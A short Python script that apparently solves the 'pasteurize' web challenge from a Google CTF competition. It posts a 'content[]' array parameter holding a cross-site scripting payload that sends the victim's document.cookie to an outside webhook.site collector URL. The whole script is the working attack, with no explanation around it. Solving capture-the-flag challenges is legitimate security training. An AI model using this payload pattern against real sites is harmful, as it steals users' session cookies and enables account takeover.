#!/usr/bin/env python3

#JOHN Hammond method result

import requests

url = "https://pasteurize.web.ctfcompetition.com/"

req = requests.post(url,data = {
    "content[]": ";new Image().src='https://webhook.site/8db05257-6ad1-44a9-979a-574c1caca5d6?asdf='+document.cookie//"
})

print(req.text)


